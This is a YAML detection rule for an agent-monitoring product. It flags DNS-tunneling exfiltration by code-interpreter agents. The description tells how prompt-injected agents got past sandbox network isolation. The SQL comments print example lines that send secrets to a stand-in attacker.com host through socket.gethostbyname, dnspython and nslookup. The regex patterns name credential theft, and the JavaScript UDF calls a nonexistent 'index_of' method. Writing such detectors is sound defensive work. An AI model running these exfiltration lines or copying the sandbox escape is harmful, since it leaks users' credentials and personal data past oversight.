id: rp-053
name: "Code Interpreter DNS Tunneling Covert Exfiltration Detector"
version: "0.2.1"
description: |
  Detects covert data exfiltration via DNS tunneling generated by code interpreter agents. Unit42 (Apr 7 2026) and Aurascape AuraLabs (Jan 14 2026) confirmed that AWS AgentCore Code Interpreter's "network isolation mode" permitted outbound DNS resolution — enabling silent exfiltration of SSNs, API keys, and environment variables as DNS subdomain labels (e.g. 123-45-6789.attacker.com) with no HTTP egress. Claude Code GitHub issue #36907 documented the same bypass in DevContainer environments: firewall allows DNS to arbitrary servers, enabling base32-encoded API key exfiltration via socket.gethostbyname(). Attack is typically injected via indirect prompt injection in retrieved files or explicit user instructions. Data encoded in DNS labels (up to 63 chars per label, 253 total) is invisible to HTTP-based DLP, network monitoring, and output content scanners.

  Distinct from rp-007 (SSRF via HTTP tools — HTTP fetch tool targeting metadata IPs) and rp-002 (DLP Sentinel — API keys in HTTP URLs). This rule targets code interpreter tools generating socket/dns DNS resolution code for covert channel use.

  References: Unit42 "Cracks in the Bedrock: Escaping the AWS AgentCore Sandbox" Apr 7 2026, Aurascape "Silent Leak: DNS Tunneling in AWS AgentCore" Jan 14 2026, Claude Code GitHub #36907 "DevContainer firewall allows DNS to arbitrary servers", OWASP LLM02:2025, MITRE T1048.001 (Exfiltration Over DNS) -
  - https://unit42.paloaltonetworks.com/bypass-of-aws-sandbox-network-isolation-mode/,
  - https://aurascape.ai/resources/auralabs-research/silent-leak-dns-tunneling-aws-agentcore-code-interpreter/,
  - https://github.com/anthropics/claude-code/issues/36907

severity: critical
category: data_exfiltration_and_leakage
fp_rate: low
hook_sources: "tool_invoke,tool_complete"
required_telemetry: ""
author: "AgentGuard Research Team"
tags:
  - security
  - dns-tunneling
  - code-interpreter
  - covert-exfiltration
  - aws-agentcore
  - sandbox-bypass
  - owasp-llm02
  - mitre-t1048
  - claude-code
udfs:
  - |
    CREATE OR REPLACE FUNCTION ag_dns_exfil_check(v string)
    RETURNS bool
    LANGUAGE JAVASCRIPT AS $$
    function ag_dns_exfil_check(values) {
      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
      function b64decode(s) {
        s = s.replace(/-/g,'+').replace(/_/g,'/');
        while (s.length % 4) s += '=';
        var out = '', buf = 0, acc = 0;
        for (var i = 0; i < s.length; i++) {
          var n = chars.index_of(s[i]);
          if (n < 0) { if (s[i]==='=') break; return null; }
          buf = (buf << 6) | n; acc += 6;
          if (acc >= 8) { acc -= 8; out += String.fromCharCode((buf >> acc) & 0xff); }
        }
        return out;
      }
      function entropy(s) {
        var freq = {}, len = s.length; if (!len) return 0;
        for (var i = 0; i < len; i++) freq[s[i]] = (freq[s[i]]||0)+1;
        var e = 0;
        for (var c in freq) { var p=freq[c]/len; e -= p*Math.log2(p); }
        return e;
      }
      return values.map(function(v) {
        if (typeof v !== 'string') return false;
        var domains = v.match(/([a-zA-Z0-9][a-zA-Z0-9\-_]{8,})\.[a-z]{2,10}/g) || [];
        for (var i = 0; i < domains.length; i++) {
          var dot = domains[i].lastIndexOf('.');
          var sub = domains[i].substring(0, dot);
          if (!sub || sub.length < 8) continue;
          // Check 1: base64 decodable to meaningful data (>8 chars)
          try { var dec = b64decode(sub); if (dec && dec.length > 8) return true; } catch(e) {}
          // Check 2: all hex (hex-encoded exfil)
          if (/^[0-9a-f]{20,}$/i.test(sub)) return true;
          // Check 3: high entropy subdomain
          if (sub.length >= 20 && entropy(sub) > 4.0) return true;
          // Check 4: very long subdomain (>30 chars)
          if (sub.length > 30) return true;
        }
        return false;
      });
    }
    $$;
sql_template: |
  -- v0.2.0 (2026-04-19):
  -- ADDED ag_dns_exfil_check() JS UDF: detects high-entropy/base64-decodable
  --   subdomains in code interpreter output (tool_result) — catches the DNS
  --   resolution *result* or echoed domain in stdout, complementing the code
  --   pattern detection in tool_input (Branch 1-5).
  -- ADDED Branch 6: UNION ALL branch querying tool_result for actual exfil domains.
  -- v0.1.0 (2026-04-17):
  -- NEW: Code interpreter DNS tunneling exfiltration (Unit42 AgentCore Apr 2026,
  -- Aurascape Jan 2026, Claude Code #36907).
  -- Attack: LLM generates Python code using socket.gethostbyname/getaddrinfo to
  -- encode sensitive data (SSN/API keys) as DNS subdomain labels to attacker domain.
  -- Gated to code interpreter tool_name to distinguish from legitimate DNS tools.
  -- Branch 1: socket DNS API calls (primary covert channel)
  -- Branch 2: dnspython library usage
  -- Branch 3: subprocess-based DNS CLI tools
  -- Branch 4: encoding + DNS exfil chain (strong dual-signal indicator)
  -- Branch 5: DNS + file/env read combination (exfil chain)
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'DNS tunneling exfil pattern in code interpreter [', coalesce(tool_name, 'unknown'),
      ']: agent-generated code may be encoding data in DNS queries. Agent: ', agent_id
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type IN ('tool_invoke', 'tool_complete')
    AND tool_name IN (
      'execute_code', 'code_interpreter', 'run_code', 'execute_python',
      'python', 'repl', 'python_interpreter', 'sandboxed_exec'
    )
    AND (
      -- Branch 1: Python socket DNS resolution API (Aurascape/Unit42 primary PoC)
      -- socket.gethostbyname(f"{secret}.attacker.com") — most common DNS exfil pattern
      match(lower(tool_input), 'socket[.](gethostbyname|getaddrinfo|getnameinfo)')
      -- Branch 2: dnspython library DNS resolution
      -- dns.resolver.resolve("secret.attacker.com", "A")
      OR match(lower(tool_input), 'dns[.](resolver|query)[.](resolve|query|make_query)')
      -- Branch 3: subprocess DNS CLI tools within Python code
      -- subprocess.run(["nslookup", f"{data}.attacker.com"])
      OR match(lower(tool_input), 'subprocess.{0,100}(nslookup|dig\b|nslookup\b|resolv)')
      -- Branch 4: encoding combined with DNS (high-confidence exfil chain signal)
      -- base64.b32encode(secret).decode() + socket.gethostbyname(encoded + ".attacker.com")
      OR match(lower(tool_input), '(base64|base32|binascii|hex|zlib).{0,200}socket[.](gethostbyname|getaddrinfo)')
      OR match(lower(tool_input), 'socket[.](gethostbyname|getaddrinfo).{0,200}(base64|base32|binascii|encode|b32encode|b64encode)')
      -- Branch 5: DNS + sensitive data source chain (file or environment read → DNS)
      -- Read CSV/file/env → encode → gethostbyname(encoded_data + ".attacker.com")
      OR match(lower(tool_input), 'socket[.](gethostbyname|getaddrinfo).{0,300}(environ|getenv|open[(]|csv[.]reader|readlines)')
      OR match(lower(tool_input), '(environ|getenv|open[(]|csv[.]reader|readlines).{0,300}socket[.](gethostbyname|getaddrinfo)')
    )

  UNION ALL

  -- Branch 6 (v0.2.0): UDF-based detection of exfil domains in tool_result output
  -- Catches DNS tunneling domains echoed or printed in code interpreter stdout
  -- ag_dns_exfil_check detects: base64-decodable subdomains, hex-encoded subdomains,
  -- high-entropy subdomains (entropy > 4.0), very long subdomains (>30 chars)
  SELECT
    event_time AS detected_at,
    '__rule_id__' AS rule_id,
    '__rule_name__' AS rule_name,
    'critical' AS severity,
    agent_id,
    deployment_id,
    session_id,
    run_id,
    raw_hook_name AS hook_name,
    tool_name,
    concat(
      'DNS exfil domain detected in code interpreter output [', coalesce(tool_name, 'unknown'),
      ']: high-entropy subdomain in tool_result. Agent: ', agent_id
    ) AS message,
    raw_event_data AS event_data
  FROM agentguard_cim_event
  WHERE event_type IN ('tool_complete')
    AND tool_name IN (
      'execute_code', 'code_interpreter', 'run_code', 'execute_python',
      'python', 'repl', 'python_interpreter', 'sandboxed_exec'
    )
    AND ag_dns_exfil_check(tool_result) = true
